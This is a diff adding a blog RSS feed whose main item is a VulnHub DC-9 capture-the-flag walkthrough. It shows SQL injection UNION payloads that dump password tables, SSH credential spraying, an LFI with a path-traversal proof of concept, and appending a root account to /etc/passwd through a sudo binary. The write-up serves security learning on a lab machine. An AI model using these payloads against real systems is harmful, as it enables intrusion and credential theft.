@@ -1,0 +1,1191 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>sudo on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/sudo/</link>
+    <description>Recent content in sudo on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 02 Jun 2021 01:18:59 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>VulnHub - DC-9</title>
+      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
+      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</guid>
+      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&amp;rsquo;m able to dump a bunch of users&#39; credentials. I&amp;rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.
+Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
+      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&rsquo;m able to dump a bunch of users' credentials. I&rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.</p>
+<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. So I exploited this machine in an unintended way by skipping the LFI and port knocking.</p>
+<p>Although it may look weird for a writeup, but for the sake of learning, I&rsquo;ll include the intended way (LFI and Port knocking) in the foothold section.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Blind SQL injection</li>
+<li>Local file Inclusion</li>
+<li>Port knocking</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Arpscan</li>
+<li>SQLMap</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
+<p><code>192.168.2.102</code> is the target.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan
+Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
+Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+192.168.2.2     0a:00:27:00:00:0a       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
+192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
+
+<span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+Ending arp-scan 1.9.7: <span style="color:#ae81ff">256</span> hosts scanned in 1.986 seconds <span style="color:#f92672">(</span>128.90 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
+<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span style="color:#e6db74">&#39;192.168.2.102&#39;</span> -v
+<span style="color:#75715e"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
+Host is up <span style="color:#f92672">(</span>0.00048s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Example.com - Staff Details - Welcome
+MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -p22 192.168.2.102
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-08 05:21 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
+Host is up <span style="color:#f92672">(</span>0.00075s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nc 192.168.2.102 <span style="color:#ae81ff">22</span>
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
+</p>
+<p>The Display All Records menu functions to display all user records.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
+</p>
+<p>There is a user input on the Search menu</p>
+<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
+</p>
+<p>The Manage menu has login function.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
+</p>
+<p>From here I can assume that the website uses database.</p>
+<h4 id="error-based-sql-injection---detection">Error-based SQL injection - Detection</h4>
+<p>There&rsquo;s error-based SQL injection on <code>search.php</code>. The initial detection is simple, when I try put <code>'</code> it gives bug (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a> ).</p>
+<p>I detected the SQLi vulnerability by adding a single quote  ( <code>'</code> ) at the end of user&rsquo;s first name that I want to search.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
+</p>
+<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
+</p>
+<p>But then, if I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
+<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
+</p>
+<h4 id="error-based-sql-injection---database-examination">Error-based SQL injection - Database examination</h4>
+<p>There are 6 columns available and the data type of each columns is string. The query as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>b<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">c</span><span style="color:#e6db74">&#39;,&#39;</span>d<span style="color:#e6db74">&#39;,&#39;</span>e<span style="color:#e6db74">&#39;,&#39;</span>f<span style="color:#e6db74">&#39; -- 
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
+</p>
+<p>I&rsquo;ll pull out some information such as database version, current database, and the available databases using this query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT @@version, &#39;</span><span style="color:#66d9ef">Current</span> DB:<span style="color:#e6db74">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
+</p>
+<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into their tables.</p>
+<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>Staff<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
+</p>
+<p>I&rsquo;ll get the columns on table <code>StaffDetails</code> with the following query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 FROM information_schema.columns where table_name = &#39;</span>StaffDetails<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
+</p>
+<p>I&rsquo;ll can retrieve the contents of the Username and Password column with the following query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username, &#39;</span>:<span style="color:#e6db74">&#39;, password),2,3,4,5,6 FROM Users -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
+</p>
+<p>The password is in md5 format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c
+<span style="color:#ae81ff">33</span>
+</code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code></p>
+<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
+</p>
+<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>users<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
+</p>
+<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span>UserDetails<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
+</p>
+<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents with the following query.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
+</p>
+<p>That&rsquo;s a lot of credentials. I can sort those creds with <code>sed</code> command by substituting comma with new line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ echo -n <span style="color:#e6db74">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> | sed -s <span style="color:#e6db74">&#39;s/,/\n/g&#39;</span>
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&amp;TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-chandlerb-joeyt-janitor">Shell as chandlerb, joeyt, janitor</h3>
+<h4 id="ssh-brute-force">SSH Brute-force</h4>
+<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> chandlerb:UrAG0D! 
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> joeyt:Passw0rd 
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> janitor:Ilovepeepee 
+...
+</code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
+<p>I discovered an LFI on the website after inspecting its source code</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chandlerb@dc-9:/var/www/html$ cat manage.php
+</code></pre></div><pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+	$file = 'contact-info.php';
+	$show_errors = $_SESSION['display_errors'];
+      if ($show_errors == 'yes') {
+         if(file_exists($file)) {
+            include($file);
+          } else {
+          	echo &quot;File does not exist&quot; . &quot;&lt;br /&gt;&quot;;
+			$file = $_GET['file']; # LFI vulnerability starts from here
+			include('directory/' . $file); # No validation, poc: manage?file=../../../../etc/passwd
+         }} else {
+          ?&gt;
+</code></pre><p>Using LFI is the intended way to gain a foothold before performing brute force.</p>
+<blockquote>
+<p>Log into the website using <code>admin:transorbital1</code>.</p>
+</blockquote>
+<p>With LFI I can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
+<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
+</p>
+<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">7469</span> <span style="color:#ae81ff">8475</span> 9842; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
+</p>
+<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">9842</span> <span style="color:#ae81ff">8475</span> 7469; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
+</p>
+<p>Then from here, I should perform SSH brute force.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-fredf">Shell as fredf</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+</code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
+<h4 id="ssh-brute-force-1">SSH Brute-force</h4>
+<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fredf:B4-Tru3-001 
+...
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-9» «192.168.2.103»
+$ ssh fredf@192.168.2.102
+fredf@192.168.2.102&#39;s password:
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr  8 20:10:42 2021 from 192.168.2.103
+fredf@dc-9:~$ id
+uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo-privileges---arbitrary-file-write">Sudo privileges - Arbitrary file write</h4>
+<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/home$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> fredf on dc-9:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+
+User fredf may run the following commands on dc-9:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/devstuff/dist/test/test
+</code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/opt/devstuff$ cat test.py 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
+    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
+    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
+
+<span style="color:#66d9ef">else</span> :
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
+
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
+    f<span style="color:#f92672">.</span>write(output)
+    f<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Let&rsquo;s break it down.</p>
+<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
+    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
+    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">else</span> :
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
+</code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
+    f<span style="color:#f92672">.</span>write(output)
+    f<span style="color:#f92672">.</span>close()
+</code></pre></div><p>This can be exploited in many ways, and one of them is to add a new root account to <code>/etc/passwd</code>.</p>
+<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
+$1$iamf$lq0NuDAhNy8IFlaFgiRw20
+</code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
+<p>Here is what I mean:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># From this</span>
+root:x:0:0:root:/root:/bin/bash
+<span style="color:#75715e"># To</span>
+iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
+</code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
+<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
+</code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">fredf@dc-9:/tmp$ cat /etc/passwd
+...
+janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
+janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
+iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
+</code></pre></div><h4 id="su---iamf">SU - iamf</h4>
+<p>Now I can switch to my account and get a root shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ su iamf
+Password: pass123
+root@dc-9:/tmp# whoami
+</code></pre></div><p>And here is the flag,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-9:/tmp# cd /root/
+root@dc-9:~# ls
+theflag.txt
+root@dc-9:~# cat theflag.txt 
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+</code></pre></div><p>That&rsquo;s all, thanks for reading.</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+<li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>VulnHub - DC-6</title>
+      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
+      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
+      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
